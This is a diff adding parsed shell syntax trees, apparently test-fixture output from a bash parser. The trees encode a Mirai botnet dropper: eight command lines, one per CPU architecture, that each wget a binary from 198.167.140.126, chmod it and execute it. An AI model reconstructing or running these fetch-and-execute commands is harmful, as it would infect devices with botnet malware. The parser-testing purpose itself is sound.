@@ -1,0 +1,328 @@
+ListNode(lineno=3, pos=(13, 141), parts=[
+  CommandNode(lineno=3, pos=(13, 20), parts=[
+    WordNode(lineno=3, pos=(13, 15), word='cd'),
+    WordNode(lineno=3, pos=(16, 20), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(21, 23)),
+  CommandNode(lineno=3, pos=(24, 35), parts=[
+    WordNode(lineno=3, pos=(24, 26), word='cd'),
+    WordNode(lineno=3, pos=(27, 35), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(36, 38)),
+  CommandNode(lineno=3, pos=(39, 46), parts=[
+    WordNode(lineno=3, pos=(39, 41), word='cd'),
+    WordNode(lineno=3, pos=(42, 46), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(47, 49)),
+  CommandNode(lineno=3, pos=(50, 58), parts=[
+    WordNode(lineno=3, pos=(50, 52), word='cd'),
+    WordNode(lineno=3, pos=(53, 58), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(59, 61)),
+  CommandNode(lineno=3, pos=(62, 66), parts=[
+    WordNode(lineno=3, pos=(62, 64), word='cd'),
+    WordNode(lineno=3, pos=(65, 66), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(66, 67)),
+  CommandNode(lineno=3, pos=(68, 106), parts=[
+    WordNode(lineno=3, pos=(68, 72), word='wget'),
+    WordNode(lineno=3, pos=(73, 106), word='http://198.167.140.126/mirai.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(106, 107)),
+  CommandNode(lineno=3, pos=(108, 127), parts=[
+    WordNode(lineno=3, pos=(108, 113), word='chmod'),
+    WordNode(lineno=3, pos=(114, 116), word='+x'),
+    WordNode(lineno=3, pos=(117, 127), word='mirai.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(127, 128)),
+  CommandNode(lineno=3, pos=(129, 141), parts=[
+    WordNode(lineno=3, pos=(129, 141), word='./mirai.mips'),
+  ]),
+])
+ListNode(lineno=4, pos=(142, 267), parts=[
+  CommandNode(lineno=4, pos=(142, 149), parts=[
+    WordNode(lineno=4, pos=(142, 144), word='cd'),
+    WordNode(lineno=4, pos=(145, 149), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(150, 152)),
+  CommandNode(lineno=4, pos=(153, 164), parts=[
+    WordNode(lineno=4, pos=(153, 155), word='cd'),
+    WordNode(lineno=4, pos=(156, 164), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(165, 167)),
+  CommandNode(lineno=4, pos=(168, 175), parts=[
+    WordNode(lineno=4, pos=(168, 170), word='cd'),
+    WordNode(lineno=4, pos=(171, 175), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(176, 178)),
+  CommandNode(lineno=4, pos=(179, 187), parts=[
+    WordNode(lineno=4, pos=(179, 181), word='cd'),
+    WordNode(lineno=4, pos=(182, 187), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(188, 190)),
+  CommandNode(lineno=4, pos=(191, 195), parts=[
+    WordNode(lineno=4, pos=(191, 193), word='cd'),
+    WordNode(lineno=4, pos=(194, 195), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(195, 196)),
+  CommandNode(lineno=4, pos=(197, 234), parts=[
+    WordNode(lineno=4, pos=(197, 201), word='wget'),
+    WordNode(lineno=4, pos=(202, 234), word='http://198.167.140.126/mirai.sh4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(234, 235)),
+  CommandNode(lineno=4, pos=(236, 254), parts=[
+    WordNode(lineno=4, pos=(236, 241), word='chmod'),
+    WordNode(lineno=4, pos=(242, 244), word='+x'),
+    WordNode(lineno=4, pos=(245, 254), word='mirai.sh4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(254, 255)),
+  CommandNode(lineno=4, pos=(256, 267), parts=[
+    WordNode(lineno=4, pos=(256, 267), word='./mirai.sh4'),
+  ]),
+])
+ListNode(lineno=5, pos=(268, 396), parts=[
+  CommandNode(lineno=5, pos=(268, 275), parts=[
+    WordNode(lineno=5, pos=(268, 270), word='cd'),
+    WordNode(lineno=5, pos=(271, 275), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(276, 278)),
+  CommandNode(lineno=5, pos=(279, 290), parts=[
+    WordNode(lineno=5, pos=(279, 281), word='cd'),
+    WordNode(lineno=5, pos=(282, 290), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(291, 293)),
+  CommandNode(lineno=5, pos=(294, 301), parts=[
+    WordNode(lineno=5, pos=(294, 296), word='cd'),
+    WordNode(lineno=5, pos=(297, 301), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(302, 304)),
+  CommandNode(lineno=5, pos=(305, 313), parts=[
+    WordNode(lineno=5, pos=(305, 307), word='cd'),
+    WordNode(lineno=5, pos=(308, 313), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(314, 316)),
+  CommandNode(lineno=5, pos=(317, 321), parts=[
+    WordNode(lineno=5, pos=(317, 319), word='cd'),
+    WordNode(lineno=5, pos=(320, 321), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(321, 322)),
+  CommandNode(lineno=5, pos=(323, 361), parts=[
+    WordNode(lineno=5, pos=(323, 327), word='wget'),
+    WordNode(lineno=5, pos=(328, 361), word='http://198.167.140.126/mirai.arm7'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(361, 362)),
+  CommandNode(lineno=5, pos=(363, 382), parts=[
+    WordNode(lineno=5, pos=(363, 368), word='chmod'),
+    WordNode(lineno=5, pos=(369, 371), word='+x'),
+    WordNode(lineno=5, pos=(372, 382), word='mirai.arm7'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(382, 383)),
+  CommandNode(lineno=5, pos=(384, 396), parts=[
+    WordNode(lineno=5, pos=(384, 396), word='./mirai.arm7'),
+  ]),
+])
+ListNode(lineno=6, pos=(397, 522), parts=[
+  CommandNode(lineno=6, pos=(397, 404), parts=[
+    WordNode(lineno=6, pos=(397, 399), word='cd'),
+    WordNode(lineno=6, pos=(400, 404), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(405, 407)),
+  CommandNode(lineno=6, pos=(408, 419), parts=[
+    WordNode(lineno=6, pos=(408, 410), word='cd'),
+    WordNode(lineno=6, pos=(411, 419), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(420, 422)),
+  CommandNode(lineno=6, pos=(423, 430), parts=[
+    WordNode(lineno=6, pos=(423, 425), word='cd'),
+    WordNode(lineno=6, pos=(426, 430), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(431, 433)),
+  CommandNode(lineno=6, pos=(434, 442), parts=[
+    WordNode(lineno=6, pos=(434, 436), word='cd'),
+    WordNode(lineno=6, pos=(437, 442), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(443, 445)),
+  CommandNode(lineno=6, pos=(446, 450), parts=[
+    WordNode(lineno=6, pos=(446, 448), word='cd'),
+    WordNode(lineno=6, pos=(449, 450), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(450, 451)),
+  CommandNode(lineno=6, pos=(452, 489), parts=[
+    WordNode(lineno=6, pos=(452, 456), word='wget'),
+    WordNode(lineno=6, pos=(457, 489), word='http://198.167.140.126/mirai.arm'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(489, 490)),
+  CommandNode(lineno=6, pos=(491, 509), parts=[
+    WordNode(lineno=6, pos=(491, 496), word='chmod'),
+    WordNode(lineno=6, pos=(497, 499), word='+x'),
+    WordNode(lineno=6, pos=(500, 509), word='mirai.arm'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(509, 510)),
+  CommandNode(lineno=6, pos=(511, 522), parts=[
+    WordNode(lineno=6, pos=(511, 522), word='./mirai.arm'),
+  ]),
+])
+ListNode(lineno=7, pos=(523, 651), parts=[
+  CommandNode(lineno=7, pos=(523, 530), parts=[
+    WordNode(lineno=7, pos=(523, 525), word='cd'),
+    WordNode(lineno=7, pos=(526, 530), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(531, 533)),
+  CommandNode(lineno=7, pos=(534, 545), parts=[
+    WordNode(lineno=7, pos=(534, 536), word='cd'),
+    WordNode(lineno=7, pos=(537, 545), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(546, 548)),
+  CommandNode(lineno=7, pos=(549, 556), parts=[
+    WordNode(lineno=7, pos=(549, 551), word='cd'),
+    WordNode(lineno=7, pos=(552, 556), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(557, 559)),
+  CommandNode(lineno=7, pos=(560, 568), parts=[
+    WordNode(lineno=7, pos=(560, 562), word='cd'),
+    WordNode(lineno=7, pos=(563, 568), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(569, 571)),
+  CommandNode(lineno=7, pos=(572, 576), parts=[
+    WordNode(lineno=7, pos=(572, 574), word='cd'),
+    WordNode(lineno=7, pos=(575, 576), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(576, 577)),
+  CommandNode(lineno=7, pos=(578, 616), parts=[
+    WordNode(lineno=7, pos=(578, 582), word='wget'),
+    WordNode(lineno=7, pos=(583, 616), word='http://198.167.140.126/mirai.mpsl'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(616, 617)),
+  CommandNode(lineno=7, pos=(618, 637), parts=[
+    WordNode(lineno=7, pos=(618, 623), word='chmod'),
+    WordNode(lineno=7, pos=(624, 626), word='+x'),
+    WordNode(lineno=7, pos=(627, 637), word='mirai.mpsl'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(637, 638)),
+  CommandNode(lineno=7, pos=(639, 651), parts=[
+    WordNode(lineno=7, pos=(639, 651), word='./mirai.mpsl'),
+  ]),
+])
+ListNode(lineno=8, pos=(652, 777), parts=[
+  CommandNode(lineno=8, pos=(652, 659), parts=[
+    WordNode(lineno=8, pos=(652, 654), word='cd'),
+    WordNode(lineno=8, pos=(655, 659), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(660, 662)),
+  CommandNode(lineno=8, pos=(663, 674), parts=[
+    WordNode(lineno=8, pos=(663, 665), word='cd'),
+    WordNode(lineno=8, pos=(666, 674), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(675, 677)),
+  CommandNode(lineno=8, pos=(678, 685), parts=[
+    WordNode(lineno=8, pos=(678, 680), word='cd'),
+    WordNode(lineno=8, pos=(681, 685), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(686, 688)),
+  CommandNode(lineno=8, pos=(689, 697), parts=[
+    WordNode(lineno=8, pos=(689, 691), word='cd'),
+    WordNode(lineno=8, pos=(692, 697), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(698, 700)),
+  CommandNode(lineno=8, pos=(701, 705), parts=[
+    WordNode(lineno=8, pos=(701, 703), word='cd'),
+    WordNode(lineno=8, pos=(704, 705), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(705, 706)),
+  CommandNode(lineno=8, pos=(707, 744), parts=[
+    WordNode(lineno=8, pos=(707, 711), word='wget'),
+    WordNode(lineno=8, pos=(712, 744), word='http://198.167.140.126/mirai.ppc'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(744, 745)),
+  CommandNode(lineno=8, pos=(746, 764), parts=[
+    WordNode(lineno=8, pos=(746, 751), word='chmod'),
+    WordNode(lineno=8, pos=(752, 754), word='+x'),
+    WordNode(lineno=8, pos=(755, 764), word='mirai.ppc'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(764, 765)),
+  CommandNode(lineno=8, pos=(766, 777), parts=[
+    WordNode(lineno=8, pos=(766, 777), word='./mirai.ppc'),
+  ]),
+])
+ListNode(lineno=9, pos=(778, 903), parts=[
+  CommandNode(lineno=9, pos=(778, 785), parts=[
+    WordNode(lineno=9, pos=(778, 780), word='cd'),
+    WordNode(lineno=9, pos=(781, 785), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(786, 788)),
+  CommandNode(lineno=9, pos=(789, 800), parts=[
+    WordNode(lineno=9, pos=(789, 791), word='cd'),
+    WordNode(lineno=9, pos=(792, 800), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(801, 803)),
+  CommandNode(lineno=9, pos=(804, 811), parts=[
+    WordNode(lineno=9, pos=(804, 806), word='cd'),
+    WordNode(lineno=9, pos=(807, 811), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(812, 814)),
+  CommandNode(lineno=9, pos=(815, 823), parts=[
+    WordNode(lineno=9, pos=(815, 817), word='cd'),
+    WordNode(lineno=9, pos=(818, 823), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(824, 826)),
+  CommandNode(lineno=9, pos=(827, 831), parts=[
+    WordNode(lineno=9, pos=(827, 829), word='cd'),
+    WordNode(lineno=9, pos=(830, 831), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(831, 832)),
+  CommandNode(lineno=9, pos=(833, 870), parts=[
+    WordNode(lineno=9, pos=(833, 837), word='wget'),
+    WordNode(lineno=9, pos=(838, 870), word='http://198.167.140.126/mirai.x86'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(870, 871)),
+  CommandNode(lineno=9, pos=(872, 890), parts=[
+    WordNode(lineno=9, pos=(872, 877), word='chmod'),
+    WordNode(lineno=9, pos=(878, 880), word='+x'),
+    WordNode(lineno=9, pos=(881, 890), word='mirai.x86'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(890, 891)),
+  CommandNode(lineno=9, pos=(892, 903), parts=[
+    WordNode(lineno=9, pos=(892, 903), word='./mirai.x86'),
+  ]),
+])
+ListNode(lineno=10, pos=(904, 1032), parts=[
+  CommandNode(lineno=10, pos=(904, 911), parts=[
+    WordNode(lineno=10, pos=(904, 906), word='cd'),
+    WordNode(lineno=10, pos=(907, 911), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(912, 914)),
+  CommandNode(lineno=10, pos=(915, 926), parts=[
+    WordNode(lineno=10, pos=(915, 917), word='cd'),
+    WordNode(lineno=10, pos=(918, 926), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(927, 929)),
+  CommandNode(lineno=10, pos=(930, 937), parts=[
+    WordNode(lineno=10, pos=(930, 932), word='cd'),
+    WordNode(lineno=10, pos=(933, 937), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(938, 940)),
+  CommandNode(lineno=10, pos=(941, 949), parts=[
+    WordNode(lineno=10, pos=(941, 943), word='cd'),
+    WordNode(lineno=10, pos=(944, 949), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(950, 952)),
+  CommandNode(lineno=10, pos=(953, 957), parts=[
+    WordNode(lineno=10, pos=(953, 955), word='cd'),
+    WordNode(lineno=10, pos=(956, 957), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(957, 958)),
+  CommandNode(lineno=10, pos=(959, 997), parts=[
+    WordNode(lineno=10, pos=(959, 963), word='wget'),
+    WordNode(lineno=10, pos=(964, 997), word='http://198.167.140.126/mirai.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(997, 998)),
+  CommandNode(lineno=10, pos=(999, 1018), parts=[
+    WordNode(lineno=10, pos=(999, 1004), word='chmod'),
+    WordNode(lineno=10, pos=(1005, 1007), word='+x'),
+    WordNode(lineno=10, pos=(1008, 1018), word='mirai.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1018, 1019)),
+  CommandNode(lineno=10, pos=(1020, 1032), parts=[
+    WordNode(lineno=10, pos=(1020, 1032), word='./mirai.m68k'),
+  ]),
+])
